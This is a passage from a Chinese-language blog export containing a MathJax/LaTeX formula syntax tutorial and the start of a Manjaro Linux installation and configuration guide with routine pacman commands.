<td style="text-align:center">$\overleftarrow{a+b+c+d}$</td>
</tr>
<tr>
<td style="text-align:center">\overrightarrow{a+b+c+d}</td>
<td style="text-align:center">$\overrightarrow{a+b+c+d}$</td>
</tr>
<tr>
<td style="text-align:center">\overleftrightarrow{a+b+c+d}</td>
<td style="text-align:center">$\overleftrightarrow{a+b+c+d}$</td>
</tr>
<tr>
<td style="text-align:center">\underleftarrow{a+b+c+d}</td>
<td style="text-align:center">$\underleftarrow{a+b+c+d}$</td>
</tr>
<tr>
<td style="text-align:center">\underrightarrow{a+b+c+d}</td>
<td style="text-align:center">$\underrightarrow{a+b+c+d}$</td>
</tr>
<tr>
<td style="text-align:center">\underleftrightarrow{a+b+c+d}</td>
<td style="text-align:center">$\underleftrightarrow{a+b+c+d}$</td>
</tr>
<tr>
<td style="text-align:center">\overline{a+b+c+d}</td>
<td style="text-align:center">$\overline{a+b+c+d}$</td>
</tr>
<tr>
<td style="text-align:center">\underline{a+b+c+d}</td>
<td style="text-align:center">$\underline{a+b+c+d}$</td>
</tr>
<tr>
<td style="text-align:center">\overbrace{a+b+c+d}^{Sample}</td>
<td style="text-align:center">$\overbrace{a+b+c+d}^{Sample}$</td>
</tr>
<tr>
<td style="text-align:center">\underbrace{a+b+c+d}_{Sample}</td>
<td style="text-align:center">$\underbrace{a+b+c+d}_{Sample}$</td>
</tr>
<tr>
<td style="text-align:center">\overbrace{a+\underbrace{b+c}_{1.0}+d}^{2.0}</td>
<td style="text-align:center">$\overbrace{a+\underbrace{b+c}_{1.0}+d}^{2.0}$</td>
</tr>
<tr>
<td style="text-align:center">\underbrace{a\cdot a\cdots a}_{b\text{ times}}</td>
<td style="text-align:center">$\underbrace{a\cdot a\cdots a}_{b\text{ times}}$</td>
</tr>
</tbody>
</table>
</div>
<h4 id="箭头符号"><a href="#箭头符号" class="headerlink" title="箭头符号"></a>箭头符号</h4><ul>
<li>常用：</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\implies</td>
<td style="text-align:center">$\implies$</td>
<td style="text-align:center">\iff</td>
<td style="text-align:center">$\iff$</td>
<td style="text-align:center">\impliedby</td>
<td style="text-align:center">$\impliedby$</td>
</tr>
<tr>
<td style="text-align:center">\to</td>
<td style="text-align:center">$\to$</td>
<td style="text-align:center">\mapsto</td>
<td style="text-align:center">$\mapsto$</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>其它可用符号：</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\uparrow</td>
<td style="text-align:center">$\uparrow$</td>
<td style="text-align:center">\Uparrow</td>
<td style="text-align:center">$\Uparrow$</td>
</tr>
<tr>
<td style="text-align:center">\downarrow</td>
<td style="text-align:center">$\downarrow$</td>
<td style="text-align:center">\Downarrow</td>
<td style="text-align:center">$\Downarrow$</td>
</tr>
<tr>
<td style="text-align:center">\leftarrow</td>
<td style="text-align:center">$\leftarrow$</td>
<td style="text-align:center">\Leftarrow</td>
<td style="text-align:center">$\Leftarrow$</td>
</tr>
<tr>
<td style="text-align:center">\rightarrow</td>
<td style="text-align:center">$\rightarrow$</td>
<td style="text-align:center">\Rightarrow</td>
<td style="text-align:center">$\Rightarrow$</td>
</tr>
<tr>
<td style="text-align:center">\leftrightarrow</td>
<td style="text-align:center">$\leftrightarrow$</td>
<td style="text-align:center">\Leftrightarrow</td>
<td style="text-align:center">$\Leftrightarrow$</td>
</tr>
<tr>
<td style="text-align:center">\longleftarrow</td>
<td style="text-align:center">$\longleftarrow$</td>
<td style="text-align:center">\Longleftarrow</td>
<td style="text-align:center">$\Longleftarrow$</td>
</tr>
<tr>
<td style="text-align:center">\longrightarrow</td>
<td style="text-align:center">$\longrightarrow$</td>
<td style="text-align:center">\Longrightarrow</td>
<td style="text-align:center">$\Longrightarrow$</td>
</tr>
<tr>
<td style="text-align:center">\longleftrightarrow</td>
<td style="text-align:center">$\longleftrightarrow$</td>
<td style="text-align:center">\Longleftrightarrow</td>
<td style="text-align:center">$\Longleftrightarrow$</td>
</tr>
</tbody>
</table>
</div>
<h2 id="分、根式"><a href="#分、根式" class="headerlink" title="分、根式"></a>分、根式</h2><ul>
<li><code>\frac&#123;&#125;&#123;&#125;</code>     :分式</li>
<li><code>\sqrt[]&#123;&#125;</code>     :根式</li>
</ul>
<p><strong>使用<code>\!</code>减少距离，使其公式更美观</strong></p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$\frac&#123;分子&#125;&#123;分母&#125;$</span><br><span class="line"></span><br><span class="line">$\frac&#123;x+y&#125;&#123;2&#125;$</span><br><span class="line"></span><br><span class="line">$\frac&#123;1&#125;&#123;1+\frac&#123;1&#125;&#123;2&#125;&#125;$</span><br><span class="line"></span><br><span class="line">$\sqrt[根指数]&#123;根底数&#125;$</span><br><span class="line"></span><br><span class="line">$\sqrt&#123;2&#125;&lt;\sqrt[3]&#123;3&#125;$</span><br><span class="line"></span><br><span class="line">$\sqrt&#123;1+\sqrt[p]&#123;1+a^2&#125;&#125;$</span><br><span class="line"></span><br><span class="line">$abc$ 比较 $a\!bc$</span><br><span class="line">$\frac&#123;1&#125;&#123;2&#125;$ 比较 $\frac&#123;1&#125;&#123;2^&#123;&#125;&#125;$</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line">\sqrt&#123;1+\sqrt[^p\!]&#123;1+a^2&#125;&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
<hr>
<font color="#FF0000"> **效果**: </font>

<p>$\frac{分子}{分母}$</p>
<p>$\frac{x+y}{2}$</p>
<p>$\frac{1}{1+\frac{1}{2}}$</p>
<p>$\sqrt[根指数]{根底数}$</p>
<p>$\sqrt{2}&lt;\sqrt[3]{3}$</p>
<p>$\sqrt{1+\sqrt[p]{1+a^2}}$</p>
<p><strong>Kramed对部分行间插入不兼容</strong></p>
<p>$abc$ 对比 $a!bc$</p>
<script type="math/tex; mode=display">
\sqrt{1+\sqrt[^p\! ]{1+a^2}}</script><hr>
<h2 id="求和、积、极限、积分"><a href="#求和、积、极限、积分" class="headerlink" title="求和、积、极限、积分"></a>求和、积、极限、积分</h2><ul>
<li><code>\sum</code>         :求和</li>
<li><code>\prod</code>         :积</li>
<li><code>\lim</code>         :极限</li>
<li><code>\int</code>         :积分，多重积分使用如下形式<code>`\int</code>、<code>\iint</code>、<code>\iiint</code>、<code>\iiiint</code>、<code>\idotsint</code></li>
</ul>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$\sum_&#123;i&#x3D;1&#125;^n&#123;a_i&#125;$</span><br><span class="line"></span><br><span class="line">$\sum_&#123;k&#x3D;1&#125;^&#123;n&#125;\frac&#123;1&#125;&#123;k&#125;$</span><br><span class="line"></span><br><span class="line">$\sum_&#123;k&#x3D;1&#125;^n\frac&#123;1&#125;&#123;k&#125;$</span><br><span class="line"></span><br><span class="line">$\prod_&#123;i&#x3D;1&#125;^n \frac&#123;1&#125;&#123;i^2&#125;$</span><br><span class="line"></span><br><span class="line">$\lim_&#123;x\to 0&#125;$</span><br><span class="line"></span><br><span class="line">$\int_0^xf(x)dx$</span><br><span class="line"></span><br><span class="line">$\int_a^b f(x)dx$</span><br><span class="line"></span><br><span class="line">$\int_a^b f(x)dx$</span><br><span class="line"></span><br><span class="line">多重积分</span><br><span class="line">$\int\int\quad \int\int\int\quad\int\int\int\int\quad \int\dots\int$</span><br><span class="line"></span><br><span class="line">$\iint\quad \iiint\quad \iiiint\quad \idotsint$</span><br></pre></td></tr></table></figure>
<hr>
<font color="#FF0000"> **效果**: </font>

<p>$\sum_{i=1}^n{a_i}$</p>
<p>$\sum_{k=1}^{n}\frac{1}{k}$</p>
<p>$\sum_{k=1}^n\frac{1}{k}$</p>
<p>$\prod_{i=1}^n \frac{1}{i^2}$</p>
<p>$\lim_{n \to +\infty}\frac{1}{n(n+1)}$</p>
<p>$\int_0^xf(x)dx$</p>
<p>$\int_a^b f(x)dx$</p>
<p>$\int_a^b f(x)dx$</p>
<p>$\int\int\quad \int\int\int\quad\int\int\int\int\quad \int\dots\int$</p>
<p>$\iint\quad \iiint\quad \iiiint\quad \idotsint$</p>
<hr>
<h2 id="方程组、分段函数"><a href="#方程组、分段函数" class="headerlink" title="方程组、分段函数"></a>方程组、分段函数</h2><p><strong>用到<code>cases</code>环境</strong>，<code>\begin&#123;cases&#125;</code> :起始     <code>\end&#123;cases&#125;</code> :结束</p>
<ul>
<li><strong>每行结束用<code>\\</code>标记</strong></li>
<li><strong>行间元素以<code>&amp;</code>分隔</strong></li>
</ul>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">方程组：</span><br><span class="line">$$</span><br><span class="line">a_1x+b_1y+c_1z&#x3D;d_1\\</span><br><span class="line">a_2x+b_2y+c_2z&#x3D;d_2\\</span><br><span class="line">a_3x+b_3y+c_3z&#x3D;d_3\\</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">分段函数：</span><br><span class="line">$$</span><br><span class="line">y&#x3D;\begin&#123;cases&#125;</span><br><span class="line">-x,&amp;x\leq 0 \\</span><br><span class="line">x,\quad x&gt;0</span><br><span class="line">\end&#123;cases&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
<hr>
<font color="#FF0000"> **效果**: </font>

<p>方程组：</p>
<script type="math/tex; mode=display">
a_1x+b_1y+c_1z=d_1\\
a_2x+b_2y+c_2z=d_2\\
a_3x+b_3y+c_3z=d_3\\</script><p>分段函数：</p>
<script type="math/tex; mode=display">
y=\begin{cases}
-x,&x\leq 0 \\
x,\quad x>0
\end{cases}</script><hr>
<h2 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h2><ul>
<li><p>矩阵边框环境</p>
<ul>
<li><code>pmatrix</code>：小括号<code>()</code>边框</li>
<li><code>bmatrix</code>：中括号<code>[]</code>边框</li>
<li><code>Bmatrix</code>：大括号<code>&#123;&#125;</code>边框</li>
<li><code>vmatrix</code>：单竖线<code>|</code>边框</li>
<li><code>Vmatrix</code>：双竖线<code>‖</code>边框</li>
</ul>
</li>
<li><p><code>\begin&#123;边框环境&#125;</code>     :起始标记</p>
</li>
<li><code>\end&#123;边框环境&#125;</code>         :结束标记</li>
<li><strong>每行结束用<code>\\</code>标记</strong></li>
<li><strong>行间元素以<code>&amp;</code>分隔</strong></li>
</ul>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;matrix&#125;1 &amp; 2\\</span><br><span class="line">3 &amp;4\end&#123;matrix&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line">\begin&#123;pmatrix&#125;1 &amp; 2\\</span><br><span class="line">3 &amp;4\end&#123;pmatrix&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line">\begin&#123;bmatrix&#125;1 &amp; 2\\</span><br><span class="line">3 &amp;4\end&#123;bmatrix&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">$$\begin&#123;Bmatrix&#125;1 &amp; 2\\</span><br><span class="line">3 &amp;4\end&#123;Bmatrix&#125;$$</span><br><span class="line"></span><br><span class="line">$$\begin&#123;vmatrix&#125;1 &amp; 2\\</span><br><span class="line">3 &amp;4\end&#123;vmatrix&#125;$$</span><br><span class="line"></span><br><span class="line">$$\left|\begin&#123;matrix&#125;1 &amp; 2\\</span><br><span class="line">3 &amp;4\end&#123;matrix&#125;\right|$$</span><br><span class="line"></span><br><span class="line">$$\begin&#123;Vmatrix&#125;1 &amp; 2\\</span><br><span class="line">3 &amp;4\end&#123;Vmatrix&#125;$$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<font color="#FF0000"> **效果**: </font>（注意差别）
$$
\begin{matrix}1 & 2\\
3 &4\end{matrix}
$$

$$
\begin{pmatrix}1 & 2\\
3 &4\end{pmatrix}
$$


$$
\begin{bmatrix}1 & 2\\
3 &4\end{bmatrix}
$$

$$\begin{Bmatrix}1 & 2\\
3 &4\end{Bmatrix}$$

$$\begin{vmatrix}1 & 2\\
3 &4\end{vmatrix}$$

$$\left|\begin{matrix}1 & 2\\
3 &4\end{matrix}\right|$$

$$\begin{Vmatrix}1 & 2\\
3 &4\end{Vmatrix}$$

-----



### 带省略号的矩阵

<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\mathbf&#123;X&#125; &#x3D; </span><br><span class="line">\begin&#123;bmatrix&#125;</span><br><span class="line">&#123;a_&#123;11&#125;&#125;&amp;&#123;a_&#123;12&#125;&#125;&amp;&#123;\cdots&#125;&amp;&#123;a_&#123;1n&#125;&#125;\\</span><br><span class="line">&#123;a_&#123;21&#125;&#125;&amp;&#123;a_&#123;22&#125;&#125;&amp;&#123;\cdots&#125;&amp;&#123;a_&#123;2n&#125;&#125;\\</span><br><span class="line">&#123;\vdots&#125;&amp;&#123;\vdots&#125;&amp;&#123;\ddots&#125;&amp;&#123;\vdots&#125;\\</span><br><span class="line">&#123;a_&#123;m1&#125;&#125;&amp;&#123;a_&#123;m2&#125;&#125;&amp;&#123;\cdots&#125;&amp;&#123;a_&#123;mn&#125;&#125;\\</span><br><span class="line">\end&#123;bmatrix&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

-----
<font color="#FF0000"> **效果**: </font>
$$
\mathbf{X} = 
\begin{bmatrix}
{a_{11}}&{a_{12}}&{\cdots}&{a_{1n}}\\
{a_{21}}&{a_{22}}&{\cdots}&{a_{2n}}\\
{\vdots}&{\vdots}&{\ddots}&{\vdots}\\
{a_{m1}}&{a_{m2}}&{\cdots}&{a_{mn}}\\
\end{bmatrix}
$$

-----



### 带分割符号的矩阵



## 数组排列、表格

**通过`\begin`、`\end`的环境来实现**

- **`array` 环境主要用于数组矩阵的排版，同时也能做表格**

  `{array}{|l|c|r|}` :数组环境，加`|`为列加竖线

  - `|`             :竖线
  - `l` 居左) 、`c` (居中) 、`r` (居右)
  - `\hline`         :横线
  - `&`             :分列
  - `\\`             :换行

<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\mathbf&#123;X&#125; &#x3D;</span><br><span class="line">\left( \begin&#123;array&#125;&#123;ccc&#125;</span><br><span class="line">x\_&#123;11&#125; &amp; x\_&#123;12&#125; &amp; \ldots \\</span><br><span class="line">x\_&#123;21&#125; &amp; x\_&#123;22&#125; &amp; \ldots \\</span><br><span class="line">\vdots &amp; \vdots &amp; \ddots</span><br><span class="line">\end&#123;array&#125; \right)</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">表格式数组</span><br><span class="line">$$</span><br><span class="line">\begin&#123;array&#125;&#123;c|lcr&#125;</span><br><span class="line">n &amp; \text&#123;Left&#125; &amp; \text&#123;Center&#125; &amp; \text&#123;Right&#125; \\</span><br><span class="line">\hline</span><br><span class="line">1 &amp; 0.24 &amp; 1 &amp; 125 \\</span><br><span class="line">2 &amp; -1 &amp; 189 &amp; -8 \\</span><br><span class="line">3 &amp; -20 &amp; 2000 &amp; 1+10i</span><br><span class="line">\end&#123;array&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">表格</span><br><span class="line">$$</span><br><span class="line">\left(\begin&#123;array&#125;&#123;|c|c|&#125;</span><br><span class="line"> 1 &amp; 2 \\</span><br><span class="line">\hline</span><br><span class="line"> 3 &amp; 4</span><br><span class="line">\end&#123;array&#125;\right)</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line">\begin&#123;array&#125;&#123;|l|c|r|&#125;</span><br><span class="line">\hline</span><br><span class="line"> 操作系统&amp; 发行版&amp; 编辑器\\</span><br><span class="line">\hline</span><br><span class="line"> Windows &amp; MikTeX &amp; TexMakerX\\</span><br><span class="line">\hline</span><br><span class="line"> Unix&#x2F;Linux &amp; teTeX &amp; Kile\\</span><br><span class="line">\hline</span><br><span class="line"> Mac OS &amp; MacTeX &amp; TeXShop\\</span><br><span class="line">\hline</span><br><span class="line"> 通用&amp; TeX Live &amp; TeXworks\\</span><br><span class="line">\hline</span><br><span class="line">\end&#123;array&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

------

<font color="#FF0000"> **效果**: </font>
$$
\mathbf{X} =
\left( \begin{array}{ccc}
x\_{11} & x\_{12} & \ldots \\
x\_{21} & x\_{22} & \ldots \\
\vdots & \vdots & \ddots
\end{array} \right)
$$
表格式数组
$$
\begin{array}{c|lcr}
n & \text{Left} & \text{Center} & \text{Right} \\
\hline
1 & 0.24 & 1 & 125 \\
2 & -1 & 189 & -8 \\
3 & -20 & 2000 & 1+10i
\end{array}
$$
表格
$$
\left(\begin{array}{|c|c|}
 1 & 2 \\
\hline
 3 & 4
\end{array}\right)
$$

$$
\begin{array}{|l|c|r|}
\hline
 操作系统& 发行版& 编辑器\\
\hline
 Windows & MikTeX & TexMakerX\\
\hline
 Unix/Linux & teTeX & Kile\\
\hline
 Mac OS & MacTeX & TeXShop\\
\hline
 通用& TeX Live & TeXworks\\
\hline
\end{array}
$$

------



## 长公式

**有些公式太长可其进行换行处理，通过`\begin`、`\end`的环境来实现**

- `aligned`     :对齐环境
- `multline`     :多行(不对齐)环境

<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">不对齐</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line">\begin&#123;multline&#125;</span><br><span class="line">x &#x3D; a+b+c+\\</span><br><span class="line">d+e+f+g</span><br><span class="line">\end&#123;multline&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">对齐</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line">\begin&#123;aligned&#125;</span><br><span class="line">x &#x3D; a+b+c+\\</span><br><span class="line">d+e+f+g</span><br><span class="line">\end&#123;aligned&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

-----
<font color="#FF0000"> **效果**: </font>

<p><strong>不对齐</strong></p>
<script type="math/tex; mode=display">
\begin{multline}
x = a+b+c+{} \\
d+e+f+g
\end{multline}</script><p><strong>对齐</strong></p>
<script type="math/tex; mode=display">
\begin{aligned}
x ={}& a+b+c+{} \\
&d+e+f+g
\end{aligned}</script><hr>
<h2 id="公式组"><a href="#公式组" class="headerlink" title="公式组"></a>公式组</h2><p><strong>通过<code>\begin</code>、<code>\end</code>的环境来实现</strong></p>
<ul>
<li><code>gather</code>         :不对齐(居中)环境</li>
<li><code>align</code>         :对齐1环境</li>
<li><code>eqnarray</code>     :对齐2环境</li>
</ul>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">不对对齐(居中)</span><br><span class="line">$$</span><br><span class="line">\begin&#123;gather&#125;</span><br><span class="line">a &#x3D; b+c+d \\</span><br><span class="line">x &#x3D; y+z</span><br><span class="line">\end&#123;gather&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">对齐1</span><br><span class="line">$$</span><br><span class="line">\begin&#123;align&#125;</span><br><span class="line">a &#x3D; b+c+d \\</span><br><span class="line">x &#x3D; y+z</span><br><span class="line">\end&#123;align&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">对齐2</span><br><span class="line">$$</span><br><span class="line">\begin&#123;eqnarray&#125;</span><br><span class="line">x+y &#x3D; z\\</span><br><span class="line">a&#x3D;4</span><br><span class="line">\end&#123;eqnarray&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
<hr>
<font color="#FF0000"> **效果**: </font>

<p>不对齐</p>
<script type="math/tex; mode=display">
\begin{gather}
a = b+c+d \\
x = y+z
\end{gather}</script><p>对齐1</p>
<script type="math/tex; mode=display">
\begin{align}
a = b+c+d \\
x = y+z
\end{align}</script><p>对齐2</p>
<script type="math/tex; mode=display">
\begin{eqnarray}
x+y = z
\\a=4
\end{eqnarray}</script><hr>
<h2 id="公式编号"><a href="#公式编号" class="headerlink" title="公式编号"></a>公式编号</h2><ul>
<li><code>&#123;align&#125;</code> 编号环境<ul>
<li><code>\tag&#123;n&#125;</code> 加在公式后用于给公式编号，<strong>可在环境外单独使用但只能一个,有些编辑器中<code>align</code>能自动编号</strong><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">f(x)&#x3D;x+3\tag&#123;1&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line">\begin&#123;align&#125;</span><br><span class="line">\sqrt&#123;37&#125; &amp; &#x3D; \sqrt&#123;\frac&#123;73^2-1&#125;&#123;12^2&#125;&#125; \tag&#123;1&#125;\\</span><br><span class="line"> &amp; &#x3D; \sqrt&#123;\frac&#123;73^2&#125;&#123;12^2&#125;\cdot\frac&#123;73^2-1&#125;&#123;73^2&#125;&#125; \tag&#123;2&#125;\\</span><br><span class="line"> &amp; &#x3D; \sqrt&#123;\frac&#123;73^2&#125;&#123;12^2&#125;&#125;\sqrt&#123;\frac&#123;73^2-1&#125;&#123;73^2&#125;&#125; \tag 3\\</span><br><span class="line"> &amp; &#x3D; \frac&#123;73&#125;&#123;12&#125;\sqrt&#123;1 - \frac&#123;1&#125;&#123;73^2&#125;&#125; \tag 4\\ </span><br><span class="line"> &amp; \approx \frac&#123;73&#125;&#123;12&#125;\left(1 - \frac&#123;1&#125;&#123;2\cdot73^2&#125;\right)\tag 5</span><br><span class="line">\end&#123;align&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<hr>
<font color="#FF0000"> **效果**: </font>
$$
f(x)=x+3\\\tag{1}
$$

$$
\begin{align}
\sqrt{37} & = \sqrt{\frac{73^2-1}{12^2}} \tag{1}\\
 & = \sqrt{\frac{73^2}{12^2}\cdot\frac{73^2-1}{73^2}} \tag{2}\\
 & = \sqrt{\frac{73^2}{12^2}}\sqrt{\frac{73^2-1}{73^2}} \tag 3\\
 & = \frac{73}{12}\sqrt{1 - \frac{1}{73^2}} \tag 4\\ 
 & \approx \frac{73}{12}\left(1 - \frac{1}{2\cdot73^2}\right)\tag 5
\end{align}
$$

-----



## 其他

### 删除线

**使用删除线功能必须用 $$$$ **

在公式内使用 `\require{cancel}` 来允许 **片段删除线** 的显示。
声明片段删除线后，使用 `\cancel{字符}`、`\bcancel{字符}`、`\xcancel{字符}` 和 `\cancelto{字符}` 来实现各种片段删除线效果

<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\require&#123;cancel&#125;\begin&#123;array&#125;&#123;rl&#125;</span><br><span class="line">y+\cancel&#123;x&#125;\\</span><br><span class="line">\cancel&#123;y+x&#125;\\</span><br><span class="line">y+\bcancel&#123;x&#125;\\</span><br><span class="line">y+\xcancel&#123;x&#125;\\</span><br><span class="line">y+\cancelto&#123;0&#125;&#123;x&#125;\\</span><br><span class="line">\frac&#123;1\times\cancel9&#125;&#123;\cancel9\times5&#125; &#x3D; \frac15 \\</span><br><span class="line">\end&#123;array&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>

-----

<font color="#FF0000">**效果**:</font>

<script type="math/tex; mode=display">
\require{cancel}\begin{array}{rl}
y+\cancel{x}\\
\cancel{y+x}\\
y+\bcancel{x}\\
y+\xcancel{x}\\
y+\cancelto{0}{x}\\
\frac{1\times\cancel9}{\cancel9\times5} = \frac15 \\
\end{array}</script><hr>
<p>参考：</p>
<p><a href="https://www.zybuluo.com/codeep/note/163962">Cmd Markdown 公式指导手册</a> (相对系统官方)</p>
<p><a href="https://juejin.im/post/5a6721bd518825733201c4a2">MarkDown 插入数学公式实验大集合</a></p>
<p><a href="https://oysz2016.github.io/post/8611e6fb.html">数学公式语法——Mathjax教程</a></p>
<p><a href="https://www.caam.rice.edu/~heinken/latex/symbols.pdf">莱斯大学 LaTex数学符号表</a></p>
]]></content>
      <categories>
        <category>LaTex</category>
      </categories>
      <tags>
        <tag>MathJax</tag>
        <tag>Markdown</tag>
        <tag>坑</tag>
        <tag>LaTex</tag>
      </tags>
  </entry>
  <entry>
    <title>Manjaro转移笔记</title>
    <url>/2019/07/22/Manjaro%E8%BD%AC%E7%A7%BB%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="manjaro转移笔记"><a href="#manjaro转移笔记" class="headerlink" title="manjaro转移笔记"></a>manjaro转移笔记</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="进入live模式"><a href="#进入live模式" class="headerlink" title="进入live模式"></a>进入live模式</h3><p>对时区，语言进行设置后进入live模式</p>
<p><img src="/.io//manjaro0.png" alt="manjaro0"></p>
<h3 id="配置安装"><a href="#配置安装" class="headerlink" title="配置安装"></a>配置安装</h3><a id="more"></a>
<p><img src="/.io//manjaro1.png" alt="manjaro1"></p>
<p>设置语言</p>
<p><img src="/.io//manjaro2.png" alt="manjaro2"></p>
<p>设置时区</p>
<p><img src="/.io//manjaro3.png" alt="manjaro3"></p>
<p>设置键盘（默认即可）</p>
<p><img src="/.io//manjaro4.png" alt="manjaro4"></p>
<p>根据情况选择存储器，然后选择分区方式（一整块磁盘，使用某个分区，手动去分区&lt;<code>/boot</code>或<code>/boot/efi</code>，<code>/</code>，<code>swap</code>，<code>/home</code>等&gt;），选择引导程序位置（<code>/boot</code>或<code>/boot/efi</code>）</p>
<p><img src="/.io//manjaro5.png" alt="manjaro5"></p>
<p>设置用户</p>
<p><img src="/.io//manjaro6.png" alt="manjaro6"></p>
<p>开始安装</p>
<p><img src="/.io//manjaro7.png" alt="manjaro7"></p>
<p>安装完成重启</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman-mirrors -i -c China -m rank</span><br><span class="line"><span class="comment">#选择https://mirrors.tuna.tsinghua.edu.cn/manjaro源</span></span><br><span class="line"></span><br><span class="line">sudo gedit /etc/pacman.conf</span><br><span class="line"><span class="comment">#在末尾加入：</span></span><br><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#同步软件包数据库</span></span><br><span class="line">sudo pacman -Syy</span><br><span class="line"><span class="comment">#安装archlinuxcn秘钥</span></span><br><span class="line">sudo pacman -S archlinuxcn-keyring</span><br><span class="line"></span><br><span class="line"><span class="comment">#更新</span></span><br><span class="line">sudo pacman -Su</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#无法锁定数据库,删除/var/lib/pacman/db.lck</span></span><br><span class="line">sudo /var/lib/pacman/db.lck</span><br></pre></td></tr></table></figure>
<h3 id="安装头文件"><a href="#安装头文件" class="headerlink" title="安装头文件"></a>安装头文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uname -r</span><br><span class="line">sudo pacman -Ss linux-header<span class="comment">#根据内核选择版本安装</span></span><br><span class="line">sudo pacman -S linux419-headers</span><br></pre></td></tr></table></figure>
<h3 id="删除不再被依赖的软件"><a href="#删除不再被依赖的软件" class="headerlink" title="删除不再被依赖的软件"></a>删除不再被依赖的软件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -R $(sudo pacman -Qdtq)</span><br><span class="line">sudo pacman -R (sudo pacman -Qdtq)	<span class="comment">#fish</span></span><br><span class="line"></span><br><span class="line">gamin-0.1.10-9  gnome-shell-extension-taskbar-57.0-2</span><br><span class="line">gtkmm-1:2.24.5-3  gtksourceview2-2.10.5-4  js52-52.9.0-3</span><br><span class="line">libnm-glib-1.18.2-1  libxdg-basedir-1.2.0-4</span><br></pre></td></tr></table></figure>
<h3 id="带颜色的pacman"><a href="#带颜色的pacman" class="headerlink" title="带颜色的pacman"></a>带颜色的pacman</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/pacman.conf</span><br><span class="line"><span class="comment">#修改36行，将#Color的注释去掉</span></span><br></pre></td></tr></table></figure>
<h3 id="gnome插件"><a href="#gnome插件" class="headerlink" title="gnome插件"></a>gnome插件</h3><blockquote>
<p>extensions.gnome.org</p>
</blockquote>
<p><strong>安装浏览器插件</strong></p>
<p><strong>安装控制器：</strong></p>
<p><strong>sudo pacman -S chrome-gnome-shell</strong></p>
<blockquote>
